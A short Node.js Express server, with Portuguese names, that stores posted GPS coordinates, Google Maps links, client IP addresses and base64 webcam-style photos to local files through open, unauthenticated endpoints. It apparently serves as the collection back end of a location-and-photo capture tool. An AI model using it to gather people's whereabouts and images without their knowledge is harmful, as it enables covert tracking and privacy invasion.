const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();

app.use(cors());
app.use(bodyParser.json({ limit: "10mb" }));

const garantirDiretorio = (dirPath) => {
  if (!fs.existsSync(dirPath)) {
    fs.mkdirSync(dirPath, { recursive: true });
  }
};

const salvarLocalizacao = (latitude, longitude, googleMapsLink, userIp) => {
  const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
  const fileName = `localizacao-${timestamp}.txt`;
  const filePath = path.join(__dirname, "locals", fileName);

  const dadosLocalizacao = `Latitude: ${latitude}\nLongitude: ${longitude}\nLink do Google Maps: ${googleMapsLink}\nIP:${userIp}\n\n`;

  garantirDiretorio(path.join(__dirname, "locals"));

  return new Promise((resolve, reject) => {
    fs.writeFile(filePath, dadosLocalizacao, "utf8", (err) => {
      if (err) {
        console.error("Erro ao salvar a localização:", err);
        reject(err);
      } else {
        console.log(`Localização salva no arquivo ${fileName}`);
        resolve(fileName);
      }
    });
  });
};

const salvarFoto = (foto) => {
  const base64Data = foto.replace(/^data:image\/jpeg;base64,/, "");
  const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
  const fileName = `photo-${timestamp}.jpg`;
  const filePath = path.join(__dirname, "images", fileName);

  garantirDiretorio(path.join(__dirname, "images"));

  return new Promise((resolve, reject) => {
    fs.writeFile(filePath, base64Data, "base64", (err) => {
      if (err) {
        console.error("Erro ao salvar a foto:", err);
        reject(err);
      } else {
        resolve(fileName);
      }
    });
  });
};

app.post("/salvar-localizacao", (req, res) => {
  console.log("\n=========== Nova requisição (Local) ===========");

  const { latitude, longitude, googleMapsLink } = req.body;
  const userIp = req.headers["x-forwarded-for"] || req.connection.remoteAddress;

  salvarLocalizacao(latitude, longitude, googleMapsLink, userIp)
    .then((fileName) => {
      res.json({ message: "Localização salva com sucesso!", file: fileName });
    })
    .catch((error) => {
      res.status(500).json({ message: "Erro ao salvar a localização" });
    });
});

app.post("/enviar-foto", (req, res) => {
  console.log("\n=========== Nova requisição (Foto) ===========");

  const { foto } = req.body;

  salvarFoto(foto)
    .then((fileName) => {
      res.json({ message: "Foto salva com sucesso!", file: fileName });
    })
    .catch((error) => {
      res.status(500).json({ message: "Erro ao salvar a foto" });
    });
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
